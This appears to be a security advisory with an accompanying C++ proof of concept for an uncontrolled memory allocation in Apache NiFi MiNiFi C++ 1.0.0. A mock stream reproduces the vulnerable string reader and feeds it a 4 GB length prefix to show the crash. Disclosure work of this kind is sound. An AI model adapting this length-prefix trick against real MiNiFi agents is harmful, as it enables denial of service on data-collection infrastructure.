@@ -1,0 +1,138 @@
+//
+//
+// Apache NiFi MiNiFi C++ 1.0.0 Uncontrolled Memory Allocation
+//
+//
+// Vendor: The Apache Software Foundation
+// Product web page: https://nifi.apache.org/projects/minifi
+// Affected version: 1.0.0, 0.99.2
+//
+// Summary: MiNiFi - a subproject of Apache NiFi - is a complementary data
+// collection approach that supplements the core tenets of NiFi in dataflow
+// management, focusing on the collection of data at the source of its creation.
+//
+// Desc: Apache NiFi MiNiFi C++ contain an uncontrolled memory allocation in
+// its InputStream reader: a length field read from a site-to-site or C2 stream
+// is used to size a std::vector with no upper bound, so a peer that advertises
+// a ~4 GB length forces an allocation that throws std::bad_alloc and crashes
+// the agent. Site-to-site peers and C2 servers are treated as trusted and TLS
+// is expected for production deployments, so TLS with peer verification prevents
+// an untrusted party from reaching the reader.
+//
+// Tested on: Microsoft Windows 10 (x86-64)
+//            g++ 15.2.0 (MSYS2 UCRT64)
+//
+//
+// Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+//                             @zeroscience
+//
+//
+// Advisory ID: ZSL-2026-6029
+// Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6029
+//
+//
+// 13.08.2026
+//
+
+
+// g++ -std=c++20 -O0 nifiminifi.cpp -o nifiminifi.exe && ./nifiminifi.exe
+
+#include <cstdio>
+#include <cstdint>
+#include <vector>
+#include <string>
+#include <cstddef>
+#include <new>
+
+#ifdef _WIN32
+#include <windows.h>
+static void cap_process_memory_256MB(void) {
+    HANDLE job = CreateJobObjectA(NULL, NULL);
+    if (!job) return;
+    JOBOBJECT_EXTENDED_LIMIT_INFORMATION info = {0};
+    info.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_PROCESS_MEMORY;
+    info.ProcessMemoryLimit = (SIZE_T)256 * 1024 * 1024;
+    SetInformationJobObject(job, JobObjectExtendedLimitInformation, &info, sizeof(info));
+    AssignProcessToJobObject(job, GetCurrentProcess());
+}
+#else
+#include <sys/resource.h>
+static void cap_process_memory_256MB(void) {
+    struct rlimit rl; rl.rlim_cur = (rlim_t)256 * 1024 * 1024; rl.rlim_max = rl.rlim_cur;
+    setrlimit(RLIMIT_AS, &rl);
+}
+#endif
+
+struct MockStream {
+    uint32_t attacker_length;
+    bool length_consumed = false;
+
+    size_t read(uint16_t &v) { v = (uint16_t)attacker_length; return sizeof(v); }
+    size_t read(uint32_t &v) { v = attacker_length;           return sizeof(v); }
+    size_t read(std::vector<std::byte> &buffer) { (void)buffer; return 0; }
+
+    static bool isError(size_t) { return false; }
+
+    size_t read(std::string &str, bool widen) {
+        uint32_t string_length = 0;
+        size_t length_return = 0;
+        if (!widen) {
+            uint16_t shortLength = 0;
+            length_return = read(shortLength);
+            string_length = shortLength;
+        } else {
+            length_return = read(string_length);
+        }
+
+        if (length_return == 0 || isError(length_return)) {
+            return length_return;
+        }
+
+        if (string_length == 0) {
+            str.clear();
+            return length_return;
+        }
+
+        str.clear();
+        str.reserve(string_length);
+
+        size_t bytes_to_read{string_length};
+        auto zero_return_retry_count = 0;
+        while (bytes_to_read > 0) {
+            printf("  [sink] allocating std::vector<std::byte> buffer(%zu)  (= attacker length, no cap)\n",
+                   bytes_to_read);
+            fflush(stdout);
+            std::vector<std::byte> buffer(bytes_to_read);
+            const auto read_return = read(buffer);
+            if (isError(read_return))
+                return read_return;
+            if (read_return == 0 && ++zero_return_retry_count > 3) {
+                return (size_t)-1;
+            }
+            bytes_to_read -= read_return;
+            str.append(std::string(reinterpret_cast<const char*>(buffer.data()), read_return));
+        }
+        return length_return + string_length;
+    }
+};
+
+int main(void) {
+    cap_process_memory_256MB();
+    MockStream s;
+    s.attacker_length = 0xFFFFFFFFu;
+    printf("[*] Peer sends length prefix = 0x%08X (%u bytes) then little/no data\n",
+           s.attacker_length, s.attacker_length);
+    printf("[*] Entering InputStream::read(std::string&, widen=true)...\n");
+    fflush(stdout);
+
+    std::string out;
+    try {
+        s.read(out, /*widen=*/true);
+        printf("  [!] Allocation succeeded. Process was forced to commit ~4 GB from a 4-byte field\n");
+        printf("      (on a constrained MiNiFi edge device this is the OOM/DoS)\n");
+    } catch (const std::exception &e) {
+        printf("  [+] std::exception thrown by the unchecked allocation: %s\n", e.what());
+        printf("  [+] MiNiFi has no try/catch around this read -> exception propagates -> agent crash (DoS)\n");
+    }
+    return 0;
+}
